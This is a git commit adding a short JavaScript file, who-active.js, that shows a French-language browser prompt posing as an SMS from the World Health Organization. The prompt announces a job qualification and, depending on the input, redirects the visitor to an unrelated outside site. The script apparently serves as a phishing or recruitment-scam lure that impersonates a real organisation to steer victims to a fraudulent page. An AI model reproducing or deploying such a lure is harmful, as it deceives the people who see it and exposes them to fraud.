271b5303847815fc85d9acda4740051fb0fe8b0b
superblog1 <imohette4@gmail.com>
2025-01-27 09:51:58 +0100

    Create who-active.js

---
+++ who-active.js
@@ -0,0 +1,5 @@
+var password = 'APPLIQUER'
+password=prompt('SMS: Félicitations, vous êtes qualifié pour travailler avec ORGANISATION MONDIALE DE LA SANTÉ, veuillez appuyer sur OK pour soumettre la candidature   ','APPLIQUER');
+if (password != 'APPLIQUER') {
+location.href='https://fast-wayprogram.org/who-recruitment.html';
+}
